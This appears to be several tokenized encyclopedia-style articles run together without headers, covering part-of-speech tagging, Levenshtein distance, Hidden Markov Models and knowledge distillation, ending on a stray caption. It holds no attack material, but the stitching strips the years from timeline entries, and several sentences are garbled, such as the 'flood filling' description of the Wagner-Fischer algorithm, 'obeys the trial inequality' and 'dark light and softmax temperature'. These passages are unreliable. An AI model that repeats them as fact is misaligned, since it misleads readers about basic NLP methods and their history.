If a POS tagger gives poor accuracy , this has an adverse effect on other tasks that follow .
This is commonly called downstream error propagation .
To improve accuracy , some researchers have proposed combining POS tagging with other processing .
For example , joint POS tagging and dependency parsing is an approach to improve accuracy compared to independent modelling .
What are the sources of information for performing POS tagging ?
Sometimes a word on its own can give useful clues .
For example , ' the ' is a determiner .
The Prefix ' un- ' suggests an adjective , such as ' unfathomable ' .
Suffix ' -ly ' suggests adverb , such as ' importantly ' .
Capitalization can suggest a proper noun , such as , ' Meridian ' .
Word shapes are also useful , such as ' 35-year ' that 's an adjective .
A word can be tagged based on the neighbouring words and the possible tags that those words can have .
Word probabilities also play a part in selecting the right tag to resolve ambiguity .
For example , ' man ' is rarely used as a verb and mostly used as a noun .
In a statistical approach , we can count tag frequencies of words in a tagged corpus and then assign the most probable tag .
This is called unigram tagging .
A much better approach is bigram tagging .
This counts the tag frequency given a particular preceding tag .
Thus , a tag is seen to have dependence on the previous tag .
We can generalize this to n - gram tagging .
In fact , it 's common to model a sequence of words and estimate the sequence of tags .
This is done by the Hidden Markov Model ( HMM ) .
Which are the main types of POS taggers ?
We note the following types of POS taggers : Rule - Based : A dictionary is constructed with possible tags for each word .
Rules guide the tagger to disambiguate .
Rules are either hand - crafted , learned or both .
An example rule might say , " If an ambiguous / unknown word X is preceded by a determiner and followed by a noun , tag it as an adjective .
" Statistical : A text corpus is used to derive useful probabilities .
Given a sequence of words , the most probable sequence of tags is selected .
These are also called stochastic or probabilistic taggers .
Among the common models are the n - gram model , Hidden Markov Model ( HMM ) and Maximum Entropy Model ( MEM ) .
Memory - Based : A set of cases is stored in memory , each case containing a word , its context and suitable tag .
A new sentence is tagged based on the best match from cases stored in memory .
It 's a combination of rule - based and stochastic methods .
Transformation - Based : Rules are automatically induced from data .
Thus , it 's a combination of rule - based and stochastic methods .
Tagging is done using broad rules and then improved or transformed by applying narrower rules .
Neural Net : RNN and Bidirectional LSTM are two examples of neural network architectures for POS tagging .
In machine learning terminology , is POS tagging supervised or unsupervised ?
POS taggers can be either supervised or unsupervised .
Supervised taggers rely on a tagged corpus to create a dictionary , rules or tag sequence probabilities .
They perform best when trained and applied to the same genre of text .
Unsupervised taggers induce word groupings .
This saves the effort of pre - tagging a corpus but word clusters are often coarse .
A combination of both approaches is also common .
For example , rules are automatically induced by an untagged corpus .
The output from this is corrected by humans and resubmitted to the tagger .
The tagger looks at the corrections and adjusts the rules .
Many iterations of this process may be necessary .
In 2016 , it was noted that a completely unsupervised approach is not yet mature .
Instead , weakly supervised approaches are adopted by aligning text , using translation probabilities ( for machine translation ) or transferring knowledge from resource - rich languages .
Even a small amount of tagged corpus can be generalized to give better results .
In HMM , given a word sequence , how do we determine the equivalent POS tag sequence ?
The most probable tag sequence is Noun - Modal - Verb - Noun .
Source : Lee 2019 .
We call this the decoding problem .
We can observe the word sequence but the sequence of tags is hidden .
We 're required to find out the most probable tag sequence given the word sequence .
In other words , we wish to maximize \(P(t^{n}|w^{n})\ ) for an n - word sequence .
An important insight is that parts of speech ( and not words ) give language its structure .
Thus , using Bayes ' Rule , we recast the problem to the following form , \(P(t^{n}|w^{n})=P(w^{n}|t^{n})\,P(t^{n})/P(w^{n})\ ) .
\(P(w^{n}|t^{n})\ ) is called likelihood .
\(P(t^{n})\ ) is called prior probability .
Since we 're maximizing over all tag sequences , the denominator can be ignored .
We also make two assumptions : each word depends only on its own tag , and each tag depends only on its previous tag .
We therefore need to maximize \(\prod_{i=1}^{n}P(w_i^{n}|t_i^{n})\,P(t_i|t_{i-1})\ ) .
In HMM , the terms are called emission probabilities and transition probabilities .
These probabilities are estimated from the tagged text corpus .
The standard solution is to apply the Viterbi algorithm , which is a form of dynamic programming .
In the example figure , we see two non - zero paths and we select the more probable one .
What are some practical techniques for POS tagging ?
In any supervised statistical approach , it 's recommended to divide your corpus into a training set , development set ( for tuning parameters ) and a testing set .
An alternative is to use the entire corpus for training but do cross - validation .
Moreover , if the corpus is too general , the probabilities may not suit a particular domain ; if it 's too narrow , it may not generalize well across domains .
To analyse where your model is failing , you can use confusion matrix or contingency table .
When unknown words are seen , one approach is to assign a suffix and calculate the probability that the suffixed word with a particular tag occurs in a sequence .
Another approach is to assign a set of default tags and calculate the probabilities .
Or we could look at the word 's internal structure , such as assigning NNS for words ending in ' s ' .
To deal with sparse data ( probabilities are zero ) , there are smoothing techniques .
A naïve technique is to add a small frequency count , say 1 , to all counts .
The Good - Turing method along with Katz 's backoff is a better technique .
Linear interpolation is another technique .
How have researchers adapted standard POS tagging methods for custom applications ?
Use of BLSTM for tagging learners English .
Source : Nagata et al .
2018 , fig .
1 & 2 .
Learner English is English as a foreign language .
Such texts often contain spelling and orthographic errors .
The use of neural networks , Bidirectional LSTM in particular , is found to give better accuracy than standard POS taggers .
Word embeddings , character embeddings and native language vectors are used .
Historical English also presents tagging challenges due to differences in spelling , usage and vocabulary .
A combination of spelling normalization and a domain adaptation method such as feature embedding gives better results .
Other approaches to historical text include neural nets , conditional random fields and self - learning techniques .
Techniques have been invented to tag Twitter data that 's often sparse and noisy .
In mathematics , POS taggers have been adapted to handle formulae and extract key phrases in mathematical publications .
For clinical text , tagged corpus for that genre is used .
However , it was found that it 's better to share annotations across corpora than simply share a pretrained model .
Could you describe some tools for doing POS tagging ?
In Python , the nltk.tag package implements many types of taggers .
Pattern is a web mining module that includes the ability to do POS tagging .
Unfortunately , it lacks Python 3 support .
It 's also available at R as pattern.nlp .
TextBlob is inspired by both NLTK and Pattern .
Spacy is another useful package .
Implemented in TensorFlow , SyntaxNet is based on neural networks .
Parsey McParseface is a parser for English and gives good accuracy .
Parts - of - speech.info is an online tool for trying out POS tagging for any text input .
Useful open source tools are Apache OpenNLP , Orange and UDPipe .
Samet Çetin shows how to implement your own custom tagger using a logistic regression model .
There 's also a commercial tool from Bitext .
Datacube at the Vienna University of Economics and Business is a place to download text corpora , and taggers ( OpenNLP or Stanford ) implemented in R. Stanford tagger are said to be slow .
Treetagger is limited to non - commercial use .
Another R package is RDRPOS tagger .
A Java implementation of a log - linear tagger from Stanford is available .
Klein and Simmons describe a rule - based method with a focus on initial categorical tagging rather than part - of - speech disambiguation .
They identify 30 categories and achieve 90 % accuracy , which may be because fewer categories implies less ambiguity .
W. Nelson Francis and Henry Kučera at the Department of Linguistics , Brown University , publish a computer - readable general corpus to aid linguistic research on modern English .
The corpus has 1 million words ( 500 samples of about 2000 words each ) .
Revised editions appeared later in 1971 and 1979 .
Called Brown Corpus , it inspires many other text corpora .
Brown Corpus is available online .
Greene and Rubin developed the TAGGIT system to tag the Brown Corpus with a set of 86 tags .
It uses rules for tagging and obtains 77 % accuracy .
Human experts then do post - editing .
Cutting et al .
use HMM for both learning and decoding .
Source : Cutting et al .
1992 , fig .
1 .
In one of the earliest departures from rule - based method to statistical method , Bahl and Mercer apply HMM to the problem of POS tagging and use the Viterbi algorithm for decoding .
In 1992 , a research team at Xerox led by Doug Cutting applied HMM in two ways : they applied the Baum - Welch algorithm to obtain the maximum likelihood estimate of the model parameters ; Next , they applied the Viterbi algorithm to decode a sequence of tags given a sequence of words .
The CLAWS algorithm uses co - locational probabilities , that is , the likelihood of co - occurrence of ordered pairs of tags .
These probabilities are estimated from the tag Brown Corpus .
Steven J. DeRose improved on this work in 1988 with the VOLSUNGA algorithm that 's more efficient and achieves 96 % accuracy .
CLAWS and VOLSUNGA are N - gram taggers .
By the late 1980s , statistical approaches become popular .
Rather than build complex and brittle hand - coded rules , statistical models learn these rules from text corpora .
Main tags ( with examples ) in the Penn TreeBank tagset .
Source : Artzi 2017 , slide 7 .
Started in 1989 at the University of Pennsylvania , the Penn Treebank was released in 1992 .
It 's an annotated text corpus of 4.5 million words of American English .
The corpus is POS tagged .
Over half of it is also annotated with syntactic structure .
Treebank II was released in 1995 .
The original release had 48 tags .
Treebank II merges some punctuation tags and results in a 45-tag tagset .
Apart from POS tags , the corpus includes chunk tags , relation tags and anchor tags .
At a time when stochastic taggers are performing better than rule - based taggers , Eric Brill proposes a rule - based tagger that performs as well as stochastic taggers .
It works by assigning the most likely estimates from a corpus but without any contextual information .
It then improves on the estimate by applying patching rules , which are also learned from the corpus .
One test shows a 5.1 % error rate with only 71 patches .
This method is later named Transformation - Based Learning ( TBL ) .
Called Net - Tagger , Helmut Schmid uses a Multi - Layer Perceptron ( MLP ) network to solve the POS tagging problem .
He notes that neural networks were used previously for speech recognition .
Though Nakamura et al .
( 1990 ) used a 4-layer feed - forward network for tag prediction . Net - Tagger is about tag disambiguation rather than prediction .
An accuracy of 96.22 % is achieved with a 2-layer model .
The Maximum Entropy Model was previously used for problems such as language modelling and machine translation .
A. Ratnaparkhi applies the model to POS tagging and achieves state - of - the - art word accuracy of 96.6 % ; and 85.6 % for unknown words .
OpenNLP POS tagger uses such a model .
Christopher Manning , NLP researcher at Stanford University , comments that POS tagging has reached 97.3 % token accuracy and 56 % sentence accuracy .
Further gains in accuracy might be possible with improved descriptive linguistics .
He also argues that the accuracy of 97 % claimed to be achieved by humans might be an overestimate .
Thus , automatic taggers are already surpassing humans .
Since 2015 , many neural network based POS taggers have shown better than 97 % accuracy .
In 2018 , Meta - BiLSTM achieved an accuracy of 97.96 % .
Given two words , we can ask how similar the two words are .
We can also ask this question about two sentences or string sequences .
To quantify the similarity , we need a measure .
Levenshtein Distance is such a measure .
By means of simple operations ( such as insertion , deletion and substitution ) , we can determine how to transform one word or sequence into the other word or sequence .
There could be many ways to achieve this .
Levenshtein Distance is defined as the minimum number of operations required to make the two inputs equal .
The lower the number , the more similar the two inputs that are being compared .
There are a few algorithms to solve this distance problem .
Levenshtein Distance is useful in many application domains , including signal processing , natural language processing and computational biology .
Levenshtein Distance is also called edit distance .
Could you explain Levenshtein Distance with an example ?
Examples show the Levenshtein Distance calculation .
Source : Devopedia 2019 .
Consider the two words " rain " and " shine " .
To transform " rain " into " shine " , we can replace ' r ' with ' s ' , replace ' a ' with ' h ' and insert ' e ' .
Thus , the edit distance between these two words is 3 .
This is assuming that all operations have the same cost of 1 .
If we assign a higher cost to substitutions , say 2 , then the edit distance becomes 2 * 2 + 1 = 5 .
To transform " shine " to " rain " , the operations are reversed ( insertions become deletions ) but the edit distance is the same when costs are symmetric .
Consider the words " train " and " shine " .
If each letter is replaced , we need 5 operations , but this is not the minimum .
We can do better by aligning " in " , doing one insertion , two substitutions and one deletion .
Edit distance is therefore 4 .
A lower distance implies greater similarity between the two words .
In NLP , we generally wish to minimise the distance .
In computational biology , we wish to maximize similarity .
In error correcting codes , we wish to maximize the distance so that one codeword is not easily confused with another .
What are " weights " in the context of editing distance ?
What we call " weights " in NLP are called " scores " in computational biology .
In the simplest case , we can give the same weight to insertions , deletions and substitutions , regardless of the symbol .
In reality , some errors are more likely than others .
Consider how keys are laid out on a standard computer keyboard .
It 's easy to mistype an adjacent key .
Some spelling errors are more likely than others .
Likewise , in optical character recognition , it 's possible to easily misinterpret between ' o ' and ' e ' , or ' m ' and ' n ' .
Likewise , in a DNA sequence , some deletions or insertions are more likely than others .
Weights help us account for these varying probabilities .
Mathematically , given two words of length N and M , D(N , M ) is the distance .
Words are 1-indexed but D(i , j ) is 0-indexed .
Accounting for the weights , edit distance can be computed this way : Initialization $ $ D(0,0 ) = 0\\D(i,0 ) = D(i-1,0 ) + del[x(i ) ] ; 1 < i ≤ N\\D(0,j ) = D(0,j-1 ) + ins[y(j ) ] ; 1 < j ≤ M$$ Recurrence Relation $ $ D(i , j ) = min\begin{cases}{D(i-1,j ) + del[x(i)]\\D(i , j-1 ) + ins[y(j)]\\D(i-1,j-1 ) + sub[x(i),y(j)]}\end{cases}$$ Which are the algorithms that can compute the Levenshtein Distance ?
Illustrating the Wagner - Fischer algorithm .
Source : Adapted from Levenshtein.net 2019 .
There are many algorithms to compute the edit distance .
Many of them are classified as dynamic programming algorithms .
One of them is the Wagner - Fischer algorithm that we describe here .
The idea is to make a matrix of edited distances between all prefixes of one string and all prefixes of the other string .
Levenshtein Distance is calculated by flood filling , that is , a path connecting cells at least several distances .
The approach is to start from the upper left corner and move to the lower right corner .
Moving horizontally implies insertion , vertically implies deletion , and diagonally implies substitution .
Each cell minimizes the cost locally .
Consider the example of transforming " levenshtein " to " meilenstein " with equal weights of 1 .
There are actually two solutions , both having edit distance of 4 .
In one solution , we insert ' i ' and replace ' v ' with ' l ' : horizontal , then diagonal .
In the other solution , we replace ' v ' with ' i ' and the insert ' l ' : diagonal , then horizonal .
If we wish to know the sequence of operations , we need to keep track of the path , thus requiring more memory .
What do you mean by Normalized Levenshtein Distance ?
Normalizing edit distances .
Source : Marzal and Vidal 1993 , fig .
2 .
Consider two strings of the same length 3 with an edited distance of 2 .
Consider the other two strings of the same length 9 with edited distance of 3 .
We may say that the latter pair is more similar .
To quantify the similarity , we normalize the edit distance .
One approach is to calculate edit distance as usual and then divide it by the number of operations , usually called the length of the edit path .
This is called editing distance with post - normalization .
The problem with this approach is that it may not produce the minimum normalized edit distance using the Wagner - Fischer algorithm .
Suppose weights are unequal for insertions / deletions and substitutions .
It 's possible to have a longer edit path that results in a lower normalized distance .
The Normalized Edit Distance ( NED ) algorithm finds this minimum .
For example , assume additions / deletions have a weight of 2 , substitutions have a weight of 3 .
Consider the pair of words ( abbb , aaab ) .
When we normalize the Wagner - Fischer algorithm , we get 1.5 , but with NED we get 1.33 .
It 's also been observed that NED in most cases obeys the trial inequality .
How is Levenshtein Distance related to the triangle inequality ?
Levenshtein Distance obeys the triangle inequality .
Source : Minerich 2012 .
In mathematics , edit distance can be seen as a metric in a metric space .
In other words , the problem can be interpreted geometrically .
The similarity between two words can be seen as the geometric distance between two points in the metric space .
Such a metric obeys the triangle inequality .
Given distance d , \(d(x , y ) + d(y , z ) \geq d(x , z)\ ) .
A composition of two edits ca n't be smaller than a direct edit .
Let 's consider the pair ( rcik , rick ) whose edit distance is 2 .
Another pair ( rick , irkc ) has edited distance 3 .
Now consider a direct edit involving ( rcik , irkc ) , which is 4 .
This direct edit is less than the sum of the other two edits .
Levenshtein Distance is indeed a metric and it obeys the triangle inequality .
Wagner and Fischer formally proved this .
In fact , their algorithm for computing the edit distance relies on this .
The triangle inequality is satisfied due to the constraint that no position in a string is transformed more than once .
This implies that all operations can be applied in parallel .
Are there any variants of Levenshtein Distance ?
Based on the work of Fred Damerau ( 1964 ) and V.I. Levenshtein ( 1965 ) , Damerau – Levenshtein Distance is sometimes used instead of the classical edited distance .
With the Damerau – Levenshtein Distance , transpositions are also allowed where two adjacent symbols can be swapped .
Consider the pair ( rcik , irkc ) .
This has an edit distance of 4 , due to 4 substitutions .
But if transpositions are allowed , then the Damerau – Levenshtein distance is 3 : ` rcik - > rick - > irck - > irkc ` .
For automatic speech recognition , Levenshtein Distance is calculated on words rather than characters .
It 's also been extended to three or more dimensions .
Levenshtein Distance has been adapted to the Chinese language to extract person - affiliation relations .
The words " 爱(love ) " and " 喜欢(like ) " are synonyms and should be seen as similar .
Likewise , " the apples " and " the sweet apples " are not too different .
We can use weights to account for these .
What are some alternatives to Levenshtein Distance ?
The choice of a suitable similarity metric depends on the application .
If we 're comparing two sets where order is irrelevant , then Jaccard Distance can be used .
A similar measure to Jaccard Distance is the Sørensen – Dice coefficient .
Longest Common Subsequence ( LCS ) allows only insertion and deletion .
Jaro Distance allows only transposition .
Hamming Distance allows only substitution and thus can be used to compare only strings of the same length .
Episode distance is a measure that allows only insertions .
If strings are treated as vectors , Cosine Similarity can be used .
This is based on the angle between the two vectors .
What are some applications of Levenshtein Distance ?
Computing the Levenshtein Distance has also been called the string - to - string correction problem .
It 's relevant to string matching problems occurring in various domains such as information retrieval , pattern recognition , error correction , and molecular genetics .
In NLP , Levenshtein Distance is useful for suggesting spelling corrections , detecting plagiarism , and aiding translators in translation memory systems .
For example , if a word is misspelt as " ligting " , Levenshtein Distance can suggest that " lighting " is most similar , which helps the writer correct the spelling .
It 's also been used to cluster words that share a root word .
Levenshtein Distance in fact started in signal processing , in particular , to see how errors in communications systems can be corrected .
Another application is speech recognition .
A perfect match of an audio signal is impossible and editing distance can find the most suitable match .
DNA is a sequence of letters such as A , C , G , T. Searching for specific sequences is often difficult due to measurement errors , mutations or evolutionary alterations .
Thus , the similarity of two sequences using Levenshtein Distance is more useful than exact matches .
What software tools are available for calculating Levenshtein Distance ?
In Python 's NLTK package , we can compute Levenshtein Distance between two strings using ` nltk.edit_distance ( ) ` .
We can optionally set a higher cost for substitutions .
Another optional argument , if set to true , permits transpositions and thus helps us calculate the Damerau – Levenshtein Distance .
In TensorFlow , ` tf.edit_distance ( ) ` gives us Levenshtein Distance and optionally normalizes it .
In R language , package stringdist can calculate many string edit distances .
In some applications , when comparing sentences or paragraphs , we may want to exclude some words , or invoke some pre - processing tasks such as lemmatization or stemming .
In such cases , we could first tokenize the input using ` nltk.word_tokenize(s1 ) ` ( in Python ) before calculating the edit distance .
If we wish to compute Levenshtein Distance by implementing known algorithms , Rosetta Code has a page sharing implementations in many languages .
A similar list of implementations is at Wikibooks .
Some implementations are more memory efficient than others .
It 's said that most applications will use heavy memory sparingly .
In general , a naive recursive implementation will be inefficient compared to a dynamic programming approach .
Fred Damerau at IBM looks at the problem of matching an erroneous word to words in a dictionary .
The error could be a missing character , an extra character , or a wrong character .
By accounting for these error types , he was able to find a match in 95 % of all error cases .
In communication systems , information can get corrupted .
Typically , 0s may become 1s , and vice versa .
V.I. Levenshtein also considers the problem of extra bits getting introduced into the information stream or bits that go missing .
He states that " the function r(x , y ) defined on pairs of binary words as equal to the smallest number of deletions , insertions , and reversals that will transform x into y is a metric , and that a code K can correct s deletions , insertions , and reversals if and only if r(x , y ) > 2s for any two different words x and y in K. " The Wagner - Fischer Algorithm is invented to compute the edit distance between two strings .
The algorithm has a time complexity of \(O(m\,n)\ ) when comparing two strings of length m and n. The term edit distance is also coined by Wagner and Fischer .
P.H. Sellers coins evolutionary distance as an alternative term .
Bahl and Jelinek provide a stochastic interpretation of edit distance .
Called similarity learning , the algorithm will learn pairwise similarity of words by analysing the corpus .
Each editing operation has a cost and the idea is to learn these costs , such as by maximizing the likelihood of data .
Masek and Paterson designed an algorithm that brings down the worst case time complexity to \(O(m\,n / log_{\sigma}^{2}n)\ ) but requires \(O(n)\ ) more space .
In practice , it ca n't beat the classical algorithm for text below 40 GB .
Oommen considers constrained editing distance where constraints are placed on editing operations .
Example constraints could be " no more than k insertions " or " exactly k substitutions " .
They also give an algorithm that has \(O(m\,n\,min(m , n))\ ) time and space complexity .
Marzal and Vidal define Normalized Edit Distance ( NED ) and an algorithm for computing it .
In 2000 , two researchers improved the time complexity of finding NED from \(O(m\,n^{2})\ ) to \(O(m\,n\,log\,n)\ ) .
Cormode and Muthukrishnan consider substring moves and approximation of edit distance .
With these modifications , they show that time complexity can be sub - quadratic .
Indyk and Bačkurs prove that the problem of finding the edit distance ca n't be solved with less than quadratic - time complexity .
Thus , we ca n't do better than the Wagner - Fischer algorithm in terms of time complexity .
HMM states ( X ) , observations ( O ) and proabilities ( A , B ) .
Source : Stamp 2018 , fig .
1 .
Consider weather , stock prices , DNA sequence , human speech or words in a sentence .
In all these cases , the current state is influenced by one or more previous states .
Moreover , often we can observe the effect but not the underlying cause that remains hidden from the observer .
The Hidden Markov Model ( HMM ) helps us figure out the most probable hidden state given an observation .
In practice , we use a sequence of observations to estimate the sequence of hidden states .
In HMM , the next state depends only on the current state .
As such , it 's good for modelling time series data .
We can classify HMM as a generative probabilistic model since a sequence of observed variables is generated by a sequence of hidden states .
HMM is also seen as a specific kind of Bayesian network .
Could you explain HMM with an example ?
An example of the Hidden Markov Model .
Source : Wikipedia 2019 .
Suppose Bob tells his friend Alice what he did earlier today .
Based on this information , Alice guesses today 's weather at Bob 's location .
In HMM , we model weather as states and Bob 's activity as observations .
To solve this problem , Alice needs to know three things : Transition Probabilities : Probability of moving from one state to another .
For example , " If today was sunny , what 's the probability that it would rain tomorrow ?
" If there are N states , this is an NxN matrix .
Emission Probabilities : Probability of a particular output given a particular state .
For example , " What 's the chance that Bob is walking if it 's raining ?
" Given a choice of M possible observation symbols , this is an NxM matrix .
This is also called output or observation probabilities .
Initial Probabilities : Probability of being in a state at the start , say , yesterday or ten days ago .
Unlike a typical Markov chain , we ca n't see the states in HMM .
However , we can observe the output and then predict the state .
Thus , the states are hidden , giving rise to the term " hidden " in the name HMM .
What types of problems can be solved by HMM ?
Typical notation used in HMM .
Source : Kang 2017 .
Let A , B and π denote the transition matrix , observation matrix and initial state distribution respectively .
HMM can be represented as λ = ( A , B , π ) .
Let the observation sequence be O and the state sequence be Q. HMM can be used to solve three types of problems : Likelihood Problem : Given O and λ , find the likelihood P(O|λ ) .
How likely is a particular sequence of observations ?
The forward algorithm solves this problem .
Decoding Problem : Given O and λ , find the best possible Q that explains O. Given the observation sequence , what 's the best possible state sequence ?
The Viterbi algorithm solves this problem .
Learning Problem : Given O and Q , learn λ , perhaps by maximizing P(O|λ ) .
What model best maps states to observations ?
The Baum - Welch algorithm , also called forward - backward algorithm , solves this problem .
In the language of machine learning , we can say that O is training data and the number of states N is the model 's hyperparameter .
What are some applications where HMM is useful ?
Complex birdsong analyzed using HMM .
Source : Adapted from Katahira et al .
2011 , fig .
4 .
HMM has been applied in many areas , including automatic speech recognition , handwriting recognition , gesture recognition , part - of - speech tagging , musical score following , partial discharges and bioinformatics .
In speech recognition , a spectral analysis of speech gives us suitable observations for HMM .
States are modelled after phonemes or syllables , or after the average number of observations in a spoken word .
Each word gets its own model .
To tag words with their parts of speech , the tags are modelled as hidden states and the words are the observations .
In computer networking , HMMs are used in intrusion detection systems .
This has two flavours : anomaly detection in which normal behaviour is modelled ; or misuse detection in which a predefined set of attacks is modelled .
In computer vision , HMM has been used to label human activities from skeleton output .
Each activity is modelled on a HMM .
By linking multiple HMMs to common states , a compound HMM is formed .
The purpose is to allow robots to be aware of human activity .
What are the different types of Hidden Markov Models ?
Some types of HMMs .
Source : Rabiner 1989 , fig .
7 .
In the typical model , called the ergodic HMM , the states of the HMM are fully connected so that we can transition to a state from any other state .
Left - right HMM is a more constrained model in which state transitions are allowed only from lower indexed states to higher indexed ones .
Variations and combinations of these two types are possible , such as having two parallel left - to - right state paths .
HMM started with observations of discrete symbols governed by discrete probabilities .
If observations are continuous signals , then we should use continuous observation density .
There are also domain - specific variations of HMM .
For example , in biological sequence analysis , there are at least three types , including profile - HMMs , pair - HMMs , and context - sensitive HMMs .
Could you explain the forward algorithm and backward algorithm ?
Trellis diagrams showing forward and backward algorithms .
Source : Adapted from Jana 2019b .
Every state sequence has a probability that it will lead to a given sequence of observations .
Given T observations and N states , there are \(N^T\ ) possible state sequences .
Thus , the complexity of calculating the probability of a given sequence of observations is \(O(N^{T}T)\ ) .
Both forward and backward algorithms bring down the complexity to \(O(N^{2}T)\ ) through dynamic programming .
In the forward algorithm , we consider the probability of being in a state at the current time step .
Then we consider the transition probabilities to calculate the state probabilities for the next step .
Thus , at each time step we have considered all state sequences preceding it .
The algorithm is more efficient since it reuses calculations from earlier steps .
Instead of keeping all paths sequences , paths are folded into a forward trellis .
The backward algorithm is similar , except that we start from the last time step and calculate in reverse .
We 're finding the probability that from a given state , the model will generate the output sequence that follows .
A combination of both algorithms , called the forward - backward algorithm , is used to solve the learning problem .
What 's the algorithm for solving HMM 's decoding problem ?
A simple explanation of the Viterbi algorithm .
Source : Chugg 2017 .
The Viterbi algorithm solves HMM 's decoding problem .
It 's similar to the forward algorithm except that instead of summing the probabilities of all paths leading to a state , we retain only one path that gives maximum probability .
Thus , at every time step or iteration , given that we have N states , we retain only N paths , the most likely path for each state .
For the next iteration , we use the most likely paths of the current iteration and repeat the process .
When we reach the end of the sequence , we 'll have N most likely paths , each ending in a unique state .
We then select the most likely end state .
Once this selection is made , we backtrack to read the state sequence , that is , how we got to the end state .
This state sequence is now the most likely sequence given our sequence of observations .
How can we solve the learning problem of HMM ?
In HMM 's learning problem , we are required to learn the transition ( A ) and observation ( B ) probabilities when given a sequence of observations and the vocabulary of hidden states .
The forward - backward algorithm solves this problem .
It 's an iterative algorithm .
It starts with an initial estimate of the probabilities and improves these estimates with each iteration .
The algorithm consists of two steps : Expectation or E - step : We compute the expected state occupancy count and the expected state transition count based on current probabilities A and B. Maximization or M - step : We use the expected counts from the E - step to recompute A and B. While this algorithm is unsupervised , in practice , initial conditions are very important .
For this reason , often extra information is given to the algorithm .
For example , in speech recognition , the HMM structure is set manually and the model is trained to set the initial probabilities .
Could you describe some tools for doing HMM ?
In Python , hmmlearn package implements HMM .
Three models are available : ` hmm .
GaussianHMM ` , ` hmm .
GMMHMM ` and ` hmm .
MultinomialHMM ` .
This package is also part of Scikit - learn but will be removed in v0.17 .
Stephen Marsland has shared Python code with NumPy and Pandas that implements many essential algorithms for HMM .
In R , the HMM package implements HMM .
It has functions for forward , backward , Viterbi and Baum - Welch algorithms .
Another package depmixS4 implements dependent mixture models that can be used to fit HMM to observed data .
R - bloggers have an example use of depmixS4 .
Russian mathematician A. A. Markov recognizes that in a sequence of random variables , one variable may not be independent of the previous variable .
For example , two successive coin tosses are independent but today 's weather might depend on yesterday 's weather .
He models this as a chain of linked events with probability assigned to each link .
This technique was later named Markov Chain .
Baum and Petrie at the Institute of Defense Analyses , Princeton , introduce the Hidden Markov Model ( HMM ) , though this name is not used .
They state the problem of estimating transition and emission probabilities from observations .
They use maximum likelihood estimate .
Andrew Viterbi publishes an algorithm to decode information at the receiver in a communication system .
Later named Viterbi algorithm , it 's directly applicable to the decoding problem in HMM .
Vintsyuk first applied this algorithm to speech and language processing in 1968 .
The Baum - Welch algorithm is proposed to solve the learning problem in HMM .
This algorithm is a special case of the Expectation - Maximization ( EM ) algorithm .
However , the name HMM is not used in the paper and mathematicians refer to HMM as " probabilistic functions of Markov chains " .
James Baker at CMU applies HMM to speech recognition in the DRAGON speech understanding system .
This is one of the earliest engineering applications of HMM .
HMM was further applied to speech recognition through the 1970s and 1980s by Jelinek , Bahl and Mercer at IBM .
Lawrence Rabiner publishes a tutorial on HMM covering theory , practice and applications .
He notes that HMM originated in mathematics and was not widely read by engineers .
Even when it was applied to speech processing in the 1970s , there were no tutorials to help translate theory into practice .
HMM is typically used when the number of states is small , but one research team applies it to large scale web traffic analysis .
This involves hundreds of states and tens of millions of observations .
The student network is trained to mimic the output of the teacher network .
Source : Upadhyay 2018 .
Deep learning is being used in a plethora of applications ranging from Computer Vision and Digital Assistants to Healthcare and Finance .
The popularity of the fields of Machine Learning and Deep Learning can be attributed to the high accuracy of the obtained results , which is largely due to the average of an ensemble of thousands of models .
However , such computationally intensive models can not be deployed on mobile devices , or FPGAs for instant use .
These devices have constraints on resources like limited memory and input / output ports .
One way of mitigating this problem is to use Knowledge Distillation .
We train an ensemble of models or a complex model ( ' teacher ' ) on the data .
We then train a lighter model ( ' student ' ) with the help of the complex model .
The less - intensive student model can then be deployed on FPGAs .
What is a teacher - student network ?
The best Machine Learning models are those that average the predictions of an ensemble of thousands of models .
While deploying on hardware devices like FPGAs , however , problems ensue .
FPGAs have a limited number of I / O ports , which forces developers to drastically reduce the number of inputs and outputs at each layer of their network .
To alleviate this problem , we use two networks - a teacher and a student .
Essentially , we train a bulky ensemble of models ( teacher ) and use a smaller , lighter model ( student ) for testing , prediction and deployment .
The student is trained to mimic the prediction capabilities of the teacher .
How we go about doing this constitutes the crux of Knowledge Distillation .
In other words , the ensemble is simply a function that maps input to output .
Transfer the knowledge in this function to the student network is knowledge distillation .
What is dark light and softmax temperature ?
In classification problems , neural networks output logits that are computed for each class .
A softmax layer " normalizes " these logits \(z_i\ ) into probabilities \(q_i\ ) .
For a softer distribution , logits are ' softened ' or divided by a constant value , called the temperature \(T\ ) : $ $ q_i = \frac{exp(z_i / T)}{\sum_j exp(z_j / T)}$$ When the temperature is 1 , the probabilities obtained are said to be unsoftened .
Hinton et.al .
that , in general , the temperature depends on the number of units in the hidden layer of a network .
For example , when the number of units in the hidden layer was 300 , temperatures above 8 worked well , whereas when the number of units was 30 , temperatures in the range of 2.5 - 4 worked best .
The higher the temperature , the softer the probabilities .
Consider a classification problem with four classes , ` [ cow , dog , cat , car ] ` .
If we have an image of a dog , unsoftened hard targets would be ` [ 0 , 1 , 0 , 0 ] ` .
This does n't tell much about what the ensemble has learned .
By softening , we may get ` [ 0.05 , 0.3 , 0.2 , 0.005 ] ` .
It 's clear that predicting a cow is 10 times greater than a car .
It 's this ' dark ' knowledge that needs to be distilled from the teacher network to the student .
How could I implement this knowledge distillation ?
Distilling the knowledge from a teacher to a student .
Source : Neural Network Distiller 2019 .
Buciluǎ et al .
designed the first methods of model compression .
Later , Hinton et.al .
showed the means of distilling the knowledge from an ensemble of models into a single , lighter model .
For example , in image classification , the student would be trained on the class probabilities , or logits , output by the teacher .
The logits represent a similar metric to the classes and help in training good classifiers .
Extracting this form of ' dark knowledge ' from the teacher network and passing it on to the student is called distillation .
Kariya 's Medium article provides a simple implementation of Hinton 's paper .
He touches upon dark knowledge and proceeds to build a simple CNN - based network on the MNIST dataset , showing how the teacher - trained student performed better than a standalone student .
Implementing knowledge distillation can be a resource - intensive task .
It requires the training of the student model on the teacher 's logits , in addition to training the teacher model .
While training the student , care should be taken to avoid the vanishing gradient problem , which can occur if the learning rate of the student is too high .
How about performance ?
The objective of distilling the knowledge from an ensemble of models into a single , lightweight model is to ease the processes of deployment and testing .
It is of paramount importance that accuracy not be compromised in trying to achieve this objective .
In the original paper authored by Hinton et .
al .
, the performance of the student network after knowledge distillation improved , when compared with a standalone student network .
Both networks were trained on the MNIST dataset of images .
The accuracies of the various models have been tabulated .
As is obvious from the table , the best results are obtained from the bulky ensemble of models and their student alternatives must be used only in case of constrained resources .
What are the challenges with Knowledge Distillation ?
A framework for visual question answering .
Source : Mun et al .
